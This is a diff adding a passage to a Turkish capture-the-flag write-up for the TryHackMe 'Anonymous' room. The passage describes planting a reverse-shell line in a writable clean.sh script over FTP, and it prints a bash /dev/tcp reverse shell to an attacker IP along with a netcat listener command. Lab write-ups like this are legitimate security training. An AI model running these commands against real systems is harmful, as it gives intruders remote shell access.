@@ -123,6 +123,24 @@ ftp> exit
 
 İndirdiğim dosyaları inceliyorum.
 
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/Anonymous/images/a1.png?raw=true)
+
+clean.sh dosyasının içerisine reverse shell kodu ekliyorum ve put komutuyla ftp servisine gönderiyorum.
+
+```
+sh -i >& /dev/tcp/10.14.61.127/1234 0>&1
+```
+
+netcat çalıştırmayı unutmayalım.
+
+```
+nc -nvlp 1234
+```
+
+Kısa bir süre bekledikten sonra makineye erişim sağlıyoruz.
+
+
+
 
 
 
